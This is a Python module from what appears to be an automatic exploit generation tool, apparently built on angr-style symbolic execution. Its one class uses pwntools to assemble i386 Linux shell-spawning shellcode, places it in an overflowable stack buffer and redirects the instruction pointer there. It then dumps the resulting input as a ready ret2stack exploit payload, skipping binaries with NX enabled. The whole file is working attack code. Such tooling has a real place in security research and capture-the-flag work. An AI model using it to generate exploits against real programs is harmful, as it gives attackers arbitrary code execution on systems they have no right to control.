import logging
from pwn import shellcraft, asm

l = logging.getLogger("aeg.exploit_gen")
l.setLevel("INFO")

class Exploit(object):
    def __init__(self, binary):
        self.binary = binary
        self.payload = ''
        self.shellcode = asm(shellcraft.i386.linux.sh())
        self.path = None

    def _ret2stack(self, buf):
        if buf['length'] < len(self.shellcode):
            return False
        memory = self.path.state.memory.load(buf['addr'], len(self.shellcode))
        sc = self.path.state.se.BVV(self.shellcode)

        l.info('Checking SHELLCODES in buf len: %d, addr: 0x%x ...' %
                (buf['length'], buf['addr']))
        if self.path.state.satisfiable(
                extra_constraints=(memory == sc,
                                    self.path.state.ip == buf['addr'])):
            self.path.state.add_constraints(memory == sc)
            self.path.state.add_constraints(self.path.state.ip == buf['addr'])
            self.payload = self.path.state.posix.dumps(0)
            return True
        return False

    def generate(self, path, result):
        self.path = path
        if result['elf']['NX']:
            l.info('Skipped ret2stack exploit')
            return ''

        for buf in result['buffer']:
            if self._ret2stack(buf):
                return self.payload
